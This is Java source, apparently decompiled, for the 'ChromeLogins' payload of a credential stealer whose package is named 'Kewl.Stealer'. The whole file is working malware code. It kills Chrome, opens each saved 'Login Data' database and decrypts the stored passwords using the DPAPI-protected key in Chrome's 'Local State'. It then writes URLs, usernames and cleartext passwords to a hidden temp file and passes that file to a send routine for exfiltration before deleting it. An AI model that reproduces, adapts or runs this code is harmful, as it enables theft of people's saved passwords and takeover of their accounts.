package Kewl.Stealer.payload.payloads.browsers;

import Kewl.Stealer.payload.IPayload;
import Kewl.Stealer.util.FileUtil;
import com.github.windpapi4j.WinDPAPI;
import com.github.windpapi4j.WinDPAPI.CryptProtectFlag;
import java.io.File;
import java.io.FileOutputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;

public class ChromeLogins implements IPayload {
    private static final String localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    private static final String kDPAPIKeyPrefix = "DPAPI";
    private static final int kKeyLength = 32;
    private static final int kNonceLength = 12;
    private static final String kEncryptionVersionPrefix = "v10";
    public static boolean shorten = true;
    public static boolean obfus = false;
    private static final int KEY_LENGTH = 32;
    private static final int IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 16;

    public void run() {
        try {
            for(int i = 0; i < 70; ++i) {
                Runtime.getRuntime().exec("taskkill /IM chrome.exe /F");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        File pwdDump = new File(System.getProperty("java.io.tmpdir") + "\\" + UUID.randomUUID() + ".txt");

        try {
            if (!System.getProperty("os.name").contains("Windows")) {
                System.exit(-1);
            }

            ArrayList<String> list = getChromeInfo();
            FileOutputStream dumpFile = new FileOutputStream(pwdDump);

            for(String s : list) {
                dumpFile.write(s.getBytes());
                dumpFile.write("\n".getBytes());
            }

            dumpFile.flush();
            dumpFile.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        this.send(pwdDump);
        if (pwdDump.exists()) {
            pwdDump.deleteOnExit();
        }

    }

    public static ArrayList<String> getChromeInfo() {
        ArrayList<String> toRet = new ArrayList();
        Connection c = null;
        Statement stmt = null;

        try {
            Class.forName("org.sqlite.JDBC");

            for(File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    c = DriverManager.getConnection("jdbc:sqlite:" + file.getPath());
                    c.setAutoCommit(false);
                    stmt = c.createStatement();
                    ResultSet rs = stmt.executeQuery("SELECT * FROM logins;");

                    while(rs != null && rs.next()) {
                        String url = rs.getString("origin_url");
                        if (url == null) {
                            url = rs.getString("action_url");
                        }

                        if (url == null) {
                            url = "Not found/corrupted";
                        } else if (url.length() > 40 && shorten) {
                            url = url.substring(0, 40) + "...";
                        }

                        String username = rs.getString("username_value");
                        if (username == null) {
                            username = "Not found/corrupted";
                        }

                        if (!obfus) {
                            toRet.add(String.format("URL:%s\nUsername:%-35s | Password:%-20s\n", url, username, encryptedBinaryStreamToDecryptedString(rs.getBytes("password_value"))));
                        } else {
                            toRet.add(String.format("URL:%-35s\nUsername:%-35s | Password:<Obfuscation Mode Enabled>\n", url, username));
                        }
                    }

                    rs.close();
                    stmt.close();
                    c.close();
                }
            }
        } catch (Exception var8) {
        }

        return toRet;
    }

    public static String encryptedBinaryStreamToDecryptedString(byte[] encryptedValue) {
        byte[] decrypted = null;

        try {
            boolean isV10 = (new String(encryptedValue)).startsWith("v10");
            if (WinDPAPI.isPlatformSupported()) {
                WinDPAPI winDPAPI = WinDPAPI.newInstance(new WinDPAPI.CryptProtectFlag[]{CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN});
                if (!isV10) {
                    decrypted = winDPAPI.unprotectData(encryptedValue);
                } else {
                    if (StringUtils.isEmpty(localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }

                    String localState = FileUtils.readFileToString(new File(localStateFileFullPathAndName));
                    JSONObject jsonObject = new JSONObject(localState);
                    String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.decodeBase64(encryptedKeyBase64);
                    if (!(new String(encryptedKeyBytes)).startsWith("DPAPI")) {
                        throw new IllegalStateException("Local State should start with DPAPI");
                    }

                    byte[] keyBytes = winDPAPI.unprotectData(Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length));
                    if (keyBytes.length != 32) {
                        throw new IllegalStateException("Local State key length is wrong");
                    }

                    byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "v10".length(), "v10".length() + 12);
                    encryptedValue = Arrays.copyOfRange(encryptedValue, "v10".length() + 12, encryptedValue.length);
                    decrypted = getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return new String(decrypted);
    }

    public static final byte[] getDecryptBytes(byte[] inputBytes, byte[] keyBytes, byte[] ivBytes) {
        try {
            if (inputBytes == null) {
                throw new IllegalArgumentException();
            } else if (keyBytes == null) {
                throw new IllegalArgumentException();
            } else if (keyBytes.length != 32) {
                throw new IllegalArgumentException();
            } else if (ivBytes == null) {
                throw new IllegalArgumentException();
            } else if (ivBytes.length != 12) {
                throw new IllegalArgumentException();
            } else {
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
                GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, ivBytes);
                cipher.init(2, secretKeySpec, gcmParameterSpec);
                return cipher.doFinal(inputBytes);
            }
        } catch (Exception var6) {
            return null;
        }
    }
}